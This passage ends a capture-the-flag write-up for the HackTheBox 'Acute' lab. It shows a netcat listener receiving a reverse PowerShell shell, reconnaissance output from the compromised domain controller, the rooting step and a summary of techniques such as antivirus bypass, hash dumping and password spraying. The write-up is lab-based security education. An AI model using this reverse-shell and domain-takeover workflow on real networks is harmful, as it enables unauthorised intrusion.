└> rlwrap -cAr nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.145] 51496
[...]
PS C:\Users\awallace\Documents> whoami; ipconfig /all
acute\awallace

Windows IP Configuration

   Host Name . . . . . . . . . . . . : ATSSERVER
   Primary Dns Suffix  . . . . . . . : acute.local
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : acute.local

Ethernet adapter vEthernet (VSwitch1):

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Hyper-V Virtual Ethernet Adapter
   Physical Address. . . . . . . . . : 00-15-5D-E8-0A-00
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::30d2:fb97:8091:2846%9(Preferred) 
   IPv4 Address. . . . . . . . . . . : 172.16.22.1(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 
   DHCPv6 IAID . . . . . . . . . . . : 201332061
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-29-52-A1-14-00-50-56-89-15-C4
   DNS Servers . . . . . . . . . . . : 127.0.0.1
   NetBIOS over Tcpip. . . . . . . . : Enabled

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-BD-5A
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::494b:6855:62be:d366%8(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.10.11.145(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DHCPv6 IAID . . . . . . . . . . . : 218124374
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-29-52-A1-14-00-50-56-89-15-C4
   DNS Servers . . . . . . . . . . . : 127.0.0.1
                                       8.8.8.8
[...]
```

I'm now a `Domain Admins` (`awallace` with `Site_Admin` group) on the Domain Controller! :D

## Rooted

**root.txt:**
```shell
PS C:\Users\Administrator\Desktop> type root.txt
{Redacted}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230815180535.png)

## Conclusion

What we've learned:

1. Viewing Word document metadata
2. Brute forcing PowerShell Web Access (PSWA)
3. Bypassing Anti-Virus software
4. Lateral movement in Active Directory
5. Manually enumerate Active Directory
6. Taking screenshots on post-exploitation with Meterpreter
7. Just Enough Administration
8. Dumping and cracking local SAM hashes
9. Password spraying
10. Privilege escalation via misconfigurated Batch script